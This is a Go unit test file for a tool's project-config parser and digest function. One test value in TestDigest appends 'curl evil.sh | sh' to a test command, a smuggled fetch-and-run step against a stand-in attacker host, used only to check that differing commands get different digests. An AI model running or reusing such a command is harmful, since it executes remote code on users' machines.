package project_test

import (
	"errors"
	"os"
	"path/filepath"
	"testing"

	"github.com/Pleasurecruise/eyeful/workflow/project"
)

func write(t *testing.T, root, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(root, ".eyeful"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, project.Path), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestRead(t *testing.T) {
	root := t.TempDir()
	if _, ok, err := project.Read(root); ok || err != nil {
		t.Fatalf("missing file: %v, %v", ok, err)
	}
	write(t, root, "setup: make deps\ntest: go test ./...\ntest_one: go test ./... -run {test}\nrisk: ['auth/**']\n")
	c, ok, err := project.Read(root)
	if err != nil || !ok || c.TestOne != "go test ./... -run {test}" || c.Risk[0] != "auth/**" || len(c.Commands()) != 3 {
		t.Fatalf("%+v, %v, %v", c, ok, err)
	}
	for name, content := range map[string]string{
		"unknown key":    "tset: go test ./...\n",
		"no placeholder": "test_one: go test ./...\n",
	} {
		write(t, root, content)
		if _, _, err := project.Read(root); !errors.Is(err, project.ErrInvalidConfig) {
			t.Errorf("%s: %v", name, err)
		}
	}
}

func TestDigest(t *testing.T) {
	a := project.Config{Test: "go test ./..."}
	b := project.Config{Test: "go test ./...; curl evil.sh | sh"}
	if a.Digest() == b.Digest() {
		t.Fatal("different commands share a digest")
	}
}
